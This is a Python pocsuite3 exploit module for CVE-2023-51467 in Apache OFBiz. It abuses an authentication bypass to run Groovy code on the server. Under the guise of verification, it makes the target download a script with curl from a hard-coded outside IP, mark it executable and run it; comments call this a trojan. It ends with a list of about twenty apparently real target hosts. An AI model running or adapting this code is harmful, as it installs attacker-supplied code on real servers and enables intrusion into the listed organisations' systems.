from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str
)
import re
from urllib.parse import urljoin
minimum_version_required('2.0.5')

class POC(POCBase):
    name = "CVE-2023-51467"
    def _exploit(self):
        try:
            ver_path = "/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y"
            url = urljoin(self.url,ver_path)
            res = requests.get(url,verify=False,timeout=5,allow_redirects=True)
            logger.debug(res.text)
            if res.status_code == 200 and "PONG" in res.text:
                vul_path = "/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y"
                vul_url = urljoin(self.url,vul_path)
                headers = {"Content-Type":"application/x-www-form-urlencoded"}
                data = "groovyProgram=throw+new+Exception('whoami'.execute().text);"
                res1 = requests.post(vul_url,headers=headers,data=data,verify=False,timeout=5,allow_redirects=True)
                # logger.debug(res1.text)
                if res1.status_code==200 and "security reason" not in res1.text:
                    #上传木马
                    upload_trogen = "groovyProgram=throw+new+Exception('curl -O http://129.226.83.129:9999/test.sh'.execute().text);"
                    res2 = requests.post(vul_url,headers=headers,data=upload_trogen,verify=False,timeout=5,allow_redirects=True)
                    if res2.status_code == 200 and "java.lang.Exception" in res2.text:
                        #加木马权限
                        check_file = "groovyProgram=throw+new+Exception('chmod +x test.sh'.execute().text);"
                        res3 = requests.post(vul_url,headers=headers,data=check_file,verify=False,timeout=5,allow_redirects=True)
                        if res3.status_code == 200 and "java.lang.Exception" in res3.text:
                            #执行脚本
                            exec_script = "groovyProgram=throw+new+Exception('bash test.sh'.execute().text);"
                            res4 = requests.post(vul_url,headers=headers,data=exec_script,verify=False,timeout=5,allow_redirects=True)
                            if res4.status_code == 200 and "java.lang.Exception" in res4.text:
                                return res1.text
        except requests.exceptions.RequestException as e:
            pass
    def _verify(self):
        result = {}
        res = self._exploit()
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']["URL"] = self.url
        return self.parse_output(result)

register_poc(POC)


"""https://www.saanjhi.com
https://www.polluniverse.com
https://www.noblesystem.co.kr:18443
https://www.bearvalleyappliance.com
https://shop-rp.com:8443
https://mhns8.nokdes.com:8443
https://mhns7.nokdes.com:8443
https://haatnowofbiz.redgrape.tech
https://erp.tyfordtea.com:8443
https://erp.redgrape.tech
https://erp.chaitanyaimpex.com
https://bearvalleyappliance.com
https://69.28.90.48:8443
https://69.28.90.48:8423
https://183.82.251.126:8443
https://182.18.157.76:9443
https://182.18.157.76:8443
https://14.143.5.98:8443
https://119.235.249.45:8445
https://119.235.249.45:8443
https://1.214.41.74:18443
"""